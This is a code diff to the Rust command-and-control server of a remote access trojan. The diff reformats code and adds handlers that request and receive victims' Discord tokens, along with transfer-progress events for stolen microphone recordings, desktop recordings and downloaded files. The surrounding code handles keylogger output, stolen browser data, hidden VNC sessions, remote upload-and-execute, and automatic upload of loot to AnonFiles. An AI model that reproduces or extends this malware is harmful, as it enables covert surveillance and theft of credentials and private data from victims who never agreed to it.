@@ -1,23 +1,23 @@
 use tauri::{AppHandle, Emitter};
 
 use std::collections::HashMap;
-use tokio::sync::mpsc::{Receiver, Sender};
 use std::net::SocketAddr;
+use tokio::sync::mpsc::{Receiver, Sender};
 
-use std::sync::{ Arc, Mutex };
+use std::sync::{Arc, Mutex};
 
-use rsa::{RsaPrivateKey, RsaPublicKey};
+use base64::{engine::general_purpose, Engine as _};
 use rsa::pkcs8::EncodePublicKey;
 use rsa::rand_core::OsRng;
-use base64::{engine::general_purpose, Engine as _};
+use rsa::{RsaPrivateKey, RsaPublicKey};
 
-use common::packets::*;
-use anyhow::{Context, Result};
 use crate::commands::*;
+use anyhow::{Context, Result};
+use common::packets::*;
 use common::RSA_BITS;
 
+use crate::utils::encryption::{handle_encryption_confirm, handle_encryption_request};
 use crate::utils::logger::Logger;
-use crate::utils::encryption::{handle_encryption_request, handle_encryption_confirm};
 use common::client_info::ClientInfo;
 
 pub struct ServerWrapper {
@@ -41,12 +41,13 @@ impl ServerWrapper {
         let priv_key =
             RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
         let pub_key = RsaPublicKey::from(&priv_key);
-    
+
         let get_exe_path = std::env::current_exe().unwrap();
         let exe_parent = get_exe_path.parent().unwrap();
         let resources_path = exe_parent.join("resources");
 
-        let country_reader = maxminddb::Reader::open_readfile(resources_path.join("countries.mmdb")).unwrap();
+        let country_reader =
+            maxminddb::Reader::open_readfile(resources_path.join("countries.mmdb")).unwrap();
 
         let s = Self {
             receiver,
@@ -191,13 +192,16 @@ impl ServerWrapper {
                     client_info.data.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
                     client_info.data.addr = Some(addr.to_string());
                     client_info.data.country_code = self.get_country_code(&addr).await;
-                    
+
                     self.connected_users.insert(addr, client_info.clone());
 
                     self.log_events
                         .log(
                             "client_connected",
-                            format!("Client [{}] {} connected!", addr, client_info.system.username),
+                            format!(
+                                "Client [{}] {} connected!",
+                                addr, client_info.system.username
+                            ),
                         )
                         .await;
                     self.emit_client_status(&client_info, "client_connected")
@@ -209,7 +213,10 @@ impl ServerWrapper {
                         self.log_events
                             .log(
                                 "client_disconnected",
-                                format!("Client [{}] [{}] disconnected", addr, client.system.username),
+                                format!(
+                                    "Client [{}] [{}] disconnected",
+                                    addr, client.system.username
+                                ),
                             )
                             .await;
                         self.emit_client_status(&client, "client_disconnected")
@@ -244,10 +251,14 @@ impl ServerWrapper {
 
                 InputBoxResult(addr, result) => {
                     if let Some(_client) = self.connected_users.get(&addr) {
-                        self.emit_serde_payload("inputbox_result", serde_json::json!({
-                            "addr": addr.to_string(),
-                            "result": result
-                        })).await;
+                        self.emit_serde_payload(
+                            "inputbox_result",
+                            serde_json::json!({
+                                "addr": addr.to_string(),
+                                "result": result
+                            }),
+                        )
+                        .await;
                     }
                 }
 
@@ -323,6 +334,12 @@ impl ServerWrapper {
 
                 RequestMicDevices(addr) => {
                     self.send_client_packet(&addr, ClientboundPacket::RequestMicDevices)
+                        .await
+                }
+
+                RequestDiscordTokens(addr) => {
+                    println!("Server sending RequestDiscordTokens to {}", addr);
+                    self.send_client_packet(&addr, ClientboundPacket::RequestDiscordTokens)
                         .await
                 }
 
@@ -414,14 +431,32 @@ impl ServerWrapper {
 
                 StartHVNC(addr) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Starting HVNC on client [{}] [{}]", addr, client.system.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::StartHVNC).await  
+                        self.log_events
+                            .log(
+                                "cmd_sent",
+                                format!(
+                                    "Starting HVNC on client [{}] [{}]",
+                                    addr, client.system.username
+                                ),
+                            )
+                            .await;
+                        self.send_client_packet(&addr, ClientboundPacket::StartHVNC)
+                            .await
                     }
                 }
                 StopHVNC(addr) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Stopping HVNC on client [{}] [{}]", addr, client.system.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::StopHVNC).await  
+                        self.log_events
+                            .log(
+                                "cmd_sent",
+                                format!(
+                                    "Stopping HVNC on client [{}] [{}]",
+                                    addr, client.system.username
+                                ),
+                            )
+                            .await;
+                        self.send_client_packet(&addr, ClientboundPacket::StopHVNC)
+                            .await
                     }
                 }
                 OpenExplorer(addr) => {
@@ -431,32 +466,69 @@ impl ServerWrapper {
 
                 UploadAndExecute(addr, file_data) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Uploading and executing file {} to client [{}] [{}]", file_data.name, addr, client.system.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::UploadAndExecute(file_data)).await;
+                        self.log_events
+                            .log(
+                                "cmd_sent",
+                                format!(
+                                    "Uploading and executing file {} to client [{}] [{}]",
+                                    file_data.name, addr, client.system.username
+                                ),
+                            )
+                            .await;
+                        self.send_client_packet(
+                            &addr,
+                            ClientboundPacket::UploadAndExecute(file_data),
+                        )
+                        .await;
                     }
-                },
-                
+                }
+
                 ExecuteFile(addr, path) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Executing file {} on client [{}] [{}]", path, addr, client.system.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::ExecuteFile(path)).await;
+                        self.log_events
+                            .log(
+                                "cmd_sent",
+                                format!(
+                                    "Executing file {} on client [{}] [{}]",
+                                    path, addr, client.system.username
+                                ),
+                            )
+                            .await;
+                        self.send_client_packet(&addr, ClientboundPacket::ExecuteFile(path))
+                            .await;
                     }
-                },
-                
+                }
+
                 UploadFile(addr, target_folder, file_data) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Uploading file {} to folder {} on client [{}] [{}]", file_data.name, target_folder, addr, client.system.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::UploadFile(target_folder, file_data)).await;
+                        self.log_events
+                            .log(
+                                "cmd_sent",
+                                format!(
+                                    "Uploading file {} to folder {} on client [{}] [{}]",
+                                    file_data.name, target_folder, addr, client.system.username
+                                ),
+                            )
+                            .await;
+                        self.send_client_packet(
+                            &addr,
+                            ClientboundPacket::UploadFile(target_folder, file_data),
+                        )
+                        .await;
                     }
-                },
+                }
 
                 HVNCFrame(addr, data) => {
                     println!("HVNCFrame received from {}", addr);
-                    self.emit_serde_payload("hvnc_frame", serde_json::json!({
-                        "addr": addr.to_string(),
-                        "data": general_purpose::STANDARD.encode(&data)
-                    })).await;
-                },
+                    self.emit_serde_payload(
+                        "hvnc_frame",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": general_purpose::STANDARD.encode(&data)
+                        }),
+                    )
+                    .await;
+                }
 
                 ScreenshotData(addr, data) => {
                     if let Some(_client) = self.connected_users.get(&addr) {
@@ -505,7 +577,8 @@ impl ServerWrapper {
                             "display": frame.display,
                             "data": general_purpose::STANDARD.encode(&frame.data),
                         }),
-                    ).await;
+                    )
+                    .await;
                 }
 
                 MicAudioChunk(addr, chunk) => {
@@ -518,10 +591,31 @@ impl ServerWrapper {
                             "channels": chunk.channels,
                             "data": general_purpose::STANDARD.encode(&chunk.data),
                         }),
-                    ).await;
+                    )
+                    .await;
                 }
 
                 MicRecordingFile(addr, file_data) => {
+                    let transfer_id = format!(
+                        "mic_recording_{}_{}",
+                        addr.to_string().replace(":", "_"),
+                        file_data.name
+                    );
+                    let total = file_data.data.len();
+                    let start_time = std::time::Instant::now();
+
+                    self.emit_serde_payload(
+                        "file_transfer_start",
+                        serde_json::json!({
+                            "id": transfer_id,
+                            "addr": addr.to_string(),
+                            "filename": file_data.name,
+                            "total": total,
+                            "status": "started",
+                        }),
+                    )
+                    .await;
+
                     self.emit_serde_payload(
                         "mic_recording_file",
                         serde_json::json!({
@@ -529,7 +623,23 @@ impl ServerWrapper {
                             "name": file_data.name,
                             "data": general_purpose::STANDARD.encode(&file_data.data),
                         }),
-                    ).await;
+                    )
+                    .await;
+
+                    let elapsed = start_time.elapsed().as_secs_f64().max(0.000_001);
+                    let speed = (total as f64 / elapsed).round() as u64;
+                    self.emit_serde_payload(
+                        "file_transfer_complete",
+                        serde_json::json!({
+                            "id": transfer_id,
+                            "addr": addr.to_string(),
+                            "filename": file_data.name,
+                            "total": total,
+                            "speed": speed,
+                            "data": general_purpose::STANDARD.encode(&file_data.data),
+                        }),
+                    )
+                    .await;
                 }
 
                 DesktopRecordingPreviewFrame(addr, frame) => {
@@ -543,10 +653,31 @@ impl ServerWrapper {
                             "height": frame.height,
                             "data": general_purpose::STANDARD.encode(&frame.data),
                         }),
-                    ).await;
+                    )
+                    .await;
                 }
 
                 DesktopRecordingFile(addr, file_data) => {
+                    let transfer_id = format!(
+                        "desktop_recording_{}_{}",
+                        addr.to_string().replace(":", "_"),
+                        file_data.name
+                    );
+                    let total = file_data.data.len();
+                    let start_time = std::time::Instant::now();
+
+                    self.emit_serde_payload(
+                        "file_transfer_start",
+                        serde_json::json!({
+                            "id": transfer_id,
+                            "addr": addr.to_string(),
+                            "filename": file_data.name,
+                            "total": total,
+                            "status": "started",
+                        }),
+                    )
+                    .await;
+
                     self.emit_serde_payload(
                         "desktop_recording_file",
                         serde_json::json!({
@@ -554,7 +685,23 @@ impl ServerWrapper {
                             "name": file_data.name,
                             "data": general_purpose::STANDARD.encode(&file_data.data),
                         }),
-                    ).await;
+                    )
+                    .await;
+
+                    let elapsed = start_time.elapsed().as_secs_f64().max(0.000_001);
+                    let speed = (total as f64 / elapsed).round() as u64;
+                    self.emit_serde_payload(
+                        "file_transfer_complete",
+                        serde_json::json!({
+                            "id": transfer_id,
+                            "addr": addr.to_string(),
+                            "filename": file_data.name,
+                            "total": total,
+                            "speed": speed,
+                            "data": general_purpose::STANDARD.encode(&file_data.data),
+                        }),
+                    )
+                    .await;
                 }
 
                 MicDeviceList(addr, devices) => {
@@ -564,7 +711,8 @@ impl ServerWrapper {
                             "addr": addr.to_string(),
                             "devices": devices,
                         }),
-                    ).await;
+                    )
+                    .await;
                 }
 
                 WebcamResult(addr, frame) => {
@@ -631,28 +779,91 @@ impl ServerWrapper {
                                 ),
                             )
                             .await;
-                        let _ = std::fs::write(&file_data.name, &file_data.data);
+                        let transfer_id = format!(
+                            "download_file_{}_{}",
+                            addr.to_string().replace(":", "_"),
+                            file_data.name
+                        );
+                        let total = file_data.data.len();
+                        let start_time = std::time::Instant::now();
+
+                        self.emit_serde_payload(
+                            "file_transfer_start",
+                            serde_json::json!({
+                                "id": transfer_id,
+                                "addr": addr.to_string(),
+                                "filename": file_data.name,
+                                "total": total,
+                                "status": "started",
+                            }),
+                        )
+                        .await;
+
+                        self.emit_serde_payload(
+                            "download_file_result",
+                            serde_json::json!({
+                                "addr": addr.to_string(),
+                                "name": file_data.name,
+                                "data": general_purpose::STANDARD.encode(&file_data.data),
+                            }),
+                        )
+                        .await;
+
+                        let elapsed = start_time.elapsed().as_secs_f64().max(0.000_001);
+                        let speed = (total as f64 / elapsed).round() as u64;
+                        self.emit_serde_payload(
+                            "file_transfer_complete",
+                            serde_json::json!({
+                                "id": transfer_id,
+                                "addr": addr.to_string(),
+                                "filename": file_data.name,
+                                "total": total,
+                                "speed": speed,
+                                "data": general_purpose::STANDARD.encode(&file_data.data),
+                            }),
+                        )
+                        .await;
 
                         if self.auto_upload_anonfiles {
                             let handle = self.tauri_handle.clone();
                             let data = file_data.data.clone();
                             let filename = file_data.name.clone();
                             tokio::spawn(async move {
-                                match crate::utils::anonfiles::upload_to_anonfiles(&filename, data).await {
+                                match crate::utils::anonfiles::upload_to_anonfiles(&filename, data)
+                                    .await
+                                {
                                     Ok(url) => {
                                         if let Some(h) = handle {
-                                            h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
-                                                event_type: "server_info".to_string(),
-                                                message: format!("Auto-uploaded file {} to: {}", filename, url),
-                                            }).ok();
+                                            h.lock()
+                                                .unwrap()
+                                                .emit(
+                                                    "server_log",
+                                                    crate::utils::logger::Log {
+                                                        event_type: "server_info".to_string(),
+                                                        message: format!(
+                                                            "Auto-uploaded file {} to: {}",
+                                                            filename, url
+                                                        ),
+                                                    },
+                                                )
+                                                .ok();
                                         }
                                     }
                                     Err(e) => {
                                         if let Some(h) = handle {
-                                            h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
-                                                event_type: "server_error".to_string(),
-                                                message: format!("Failed to auto-upload file {}: {}", filename, e),
-                                            }).ok();
+                                            h.lock()
+                                                .unwrap()
+                                                .emit(
+                                                    "server_log",
+                                                    crate::utils::logger::Log {
+                                                        event_type: "server_error".to_string(),
+                                                        message: format!(
+                                                            "Failed to auto-upload file {}: {}",
+                                                            filename, e
+                                                        ),
+                                                    },
+                                                )
+                                                .ok();
                                         }
                                     }
                                 }
@@ -715,51 +926,95 @@ impl ServerWrapper {
                 }
 
                 KeyloggerUpdate(addr, update) => {
-                    self.emit_serde_payload("keylogger_update", serde_json::json!({
-                        "addr": addr.to_string(),
-                        "window": update.window_title,
-                        "data": update.key_data
-                    })).await;
+                    self.emit_serde_payload(
+                        "keylogger_update",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "window": update.window_title,
+                            "data": update.key_data
+                        }),
+                    )
+                    .await;
                 }
 
                 KeyloggerOfflineLogs(addr, logs) => {
-                    self.emit_serde_payload("keylogger_offline_logs", serde_json::json!({
-                        "addr": addr.to_string(),
-                        "logs": logs
-                    })).await;
+                    self.emit_serde_payload(
+                        "keylogger_offline_logs",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "logs": logs
+                        }),
+                    )
+                    .await;
                 }
 
                 BrowserData(addr, data) => {
-                    self.emit_serde_payload("browser_data", serde_json::json!({
-                        "addr": addr.to_string(),
-                        "data": data
-                    })).await;
+                    self.emit_serde_payload(
+                        "browser_data",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data
+                        }),
+                    )
+                    .await;
 
                     if self.auto_upload_anonfiles {
                         let json_data = serde_json::to_vec_pretty(&data).unwrap_or_default();
-                        let filename = format!("browser_data_{}.json", addr.to_string().replace(":", "_"));
+                        let filename =
+                            format!("browser_data_{}.json", addr.to_string().replace(":", "_"));
                         let handle = self.tauri_handle.clone();
                         tokio::spawn(async move {
-                            match crate::utils::anonfiles::upload_to_anonfiles(&filename, json_data).await {
+                            match crate::utils::anonfiles::upload_to_anonfiles(&filename, json_data)
+                                .await
+                            {
                                 Ok(url) => {
                                     if let Some(h) = handle {
-                                        h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
-                                            event_type: "server_info".to_string(),
-                                            message: format!("Auto-uploaded browser data to: {}", url),
-                                        }).ok();
+                                        h.lock()
+                                            .unwrap()
+                                            .emit(
+                                                "server_log",
+                                                crate::utils::logger::Log {
+                                                    event_type: "server_info".to_string(),
+                                                    message: format!(
+                                                        "Auto-uploaded browser data to: {}",
+                                                        url
+                                                    ),
+                                                },
+                                            )
+                                            .ok();
                                     }
                                 }
                                 Err(e) => {
                                     if let Some(h) = handle {
-                                        h.lock().unwrap().emit("server_log", crate::utils::logger::Log {
-                                            event_type: "server_error".to_string(),
-                                            message: format!("Failed to auto-upload browser data: {}", e),
-                                        }).ok();
+                                        h.lock()
+                                            .unwrap()
+                                            .emit(
+                                                "server_log",
+                                                crate::utils::logger::Log {
+                                                    event_type: "server_error".to_string(),
+                                                    message: format!(
+                                                        "Failed to auto-upload browser data: {}",
+                                                        e
+                                                    ),
+                                                },
+                                            )
+                                            .ok();
                                     }
                                 }
                             }
                         });
                     }
+                }
+
+                DiscordTokenData(addr, data) => {
+                    self.emit_serde_payload(
+                        "discord_tokens",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "tokens": data.tokens,
+                        }),
+                    )
+                    .await;
                 }
 
                 GetBrowserData(addr) => {
@@ -769,10 +1024,13 @@ impl ServerWrapper {
 
                 SetAutoUploadAnonFiles(enabled) => {
                     self.auto_upload_anonfiles = enabled;
-                    self.log_events.log("server_info", format!("Auto upload to AnonFiles: {}", enabled)).await;
+                    self.log_events
+                        .log(
+                            "server_info",
+                            format!("Auto upload to AnonFiles: {}", enabled),
+                        )
+                        .await;
                 }
-
-
             }
         }
     }
